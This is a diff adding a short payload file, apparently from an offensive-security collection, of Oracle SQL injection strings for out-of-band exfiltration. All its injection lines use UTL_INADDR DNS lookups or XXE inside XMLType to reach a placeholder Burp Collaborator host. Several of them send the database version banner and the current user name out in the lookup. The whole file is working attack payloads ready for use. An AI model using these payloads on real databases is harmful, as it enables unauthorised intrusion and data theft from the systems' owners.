@@ -1,0 +1,17 @@
+# Oracle — Out-of-Band (OOB) / DNS exfiltration
+# Uses UTL_INADDR (requires privileges) or XXE via XMLType
+# Use Burp Collaborator or interactsh for listener
+
+# --- DNS lookup via UTL_INADDR (requires privileges) ---
+' AND 1=UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')--
+' AND 1=(SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN') FROM dual)--
+
+# --- DNS exfiltration via UTL_INADDR ---
+' AND 1=UTL_INADDR.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)||'.BURP-COLLABORATOR-SUBDOMAIN')--
+' AND 1=UTL_INADDR.get_host_address((SELECT user FROM dual)||'.BURP-COLLABORATOR-SUBDOMAIN')--
+
+# --- DNS lookup via XXE in XMLType ---
+' AND 1=EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--
+
+# --- DNS exfiltration via XXE ---
+' AND 1=EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT banner FROM v$version WHERE ROWNUM=1)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--
